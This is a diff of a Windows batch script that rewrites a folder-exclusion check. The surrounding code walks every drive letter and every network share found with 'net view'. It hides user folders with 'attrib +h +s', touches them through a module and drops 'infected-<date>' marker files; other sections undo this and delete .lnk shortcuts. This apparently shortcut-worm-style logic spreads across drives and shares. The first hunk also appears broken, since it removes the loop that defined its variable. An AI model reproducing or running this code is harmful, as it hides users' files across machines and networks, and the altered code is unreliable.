@@ -113,7 +113,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
 
   if /i "%%i:" NEQ "%systemDrive%" (
     if /i "%%i:" NEQ "D:" (
-      for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do for %%z in ("$RECYCLE.BIN" "FOUND.000" "Recycled" "System Volume Information") do if /i "%%j" NEQ %%z (
+      if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
         attrib +h +s "%%i:\%%j"
         %module_fileTouch% "%%i:\%%j" >nul
 
@@ -146,7 +146,7 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NE
 
     if not exist "%%h\%%i\System Volume Information\infected-%app_date%" (
       for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
-        for %%z in ("$RECYCLE.BIN" "$Windows.~WS" "Documents and Settings" "FOUND.000" "MSOCache" "PerfLogs" "ProgramData" "Recovery" "Recycled" "System Volume Information") do if /i "%%j" NEQ %%z (
+        if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
           attrib +h +s "%%h\%%i\%%j"
           %module_fileTouch% "%%h\%%i\%%j" >nul
 
@@ -217,7 +217,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%
 
     if exist "%%i:\System Volume Information\infected-%app_date%" del /q "%%i:\System Volume Information\infected-%app_date%"
 
-    for %%z in ("$RECYCLE.BIN" "$Windows.~WS" "Documents and Settings" "FOUND.000" "MSOCache" "PerfLogs" "ProgramData" "Recovery" "Recycled" "System Volume Information") do if /i "%%j" NEQ %%z (
+    if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
       attrib -h -s "%%i:\%%j"
       if exist "%%i:\%%j.lnk" del /q "%%i:\%%j.lnk"
     )
@@ -238,7 +238,7 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NE
 
       if exist "%%h\%%i\%%j\infected-%app_date%" del /q "%%h\%%i\%%j\infected-%app_date%"
 
-      for %%z in ("$RECYCLE.BIN" "$Windows.~WS" "Documents and Settings" "FOUND.000" "MSOCache" "PerfLogs" "ProgramData" "Recovery" "Recycled" "System Volume Information") do if /i "%%j" NEQ %%z (
+      if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
         attrib -h -s "%%h\%%i\%%j"
         if exist "%%h\%%i\%%j.lnk" del /q "%%h\%%i\%%j.lnk"
       )
@@ -348,7 +348,7 @@ attrib +h +s %*\"System Volume Information\infected-%app_date%"
 
 
 for /f "delims=" %%j in ('dir %*\* /a:d /b 2^>nul') do (
-  for %%z in ("$RECYCLE.BIN" "$Windows.~WS" "Documents and Settings" "FOUND.000" "MSOCache" "PerfLogs" "ProgramData" "Recovery" "Recycled" "System Volume Information") do if /i "%%j" NEQ %%z (
+  if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "$Windows.~WS" if /i "%%j" NEQ "Documents and Settings" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "MSOCache" if /i "%%j" NEQ "PerfLogs" if /i "%%j" NEQ "ProgramData" if /i "%%j" NEQ "Recovery" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
     attrib -h -s %*\"%%j"
     if exist %*\"%%j.lnk" del /q %*\"%%j.lnk"
   )
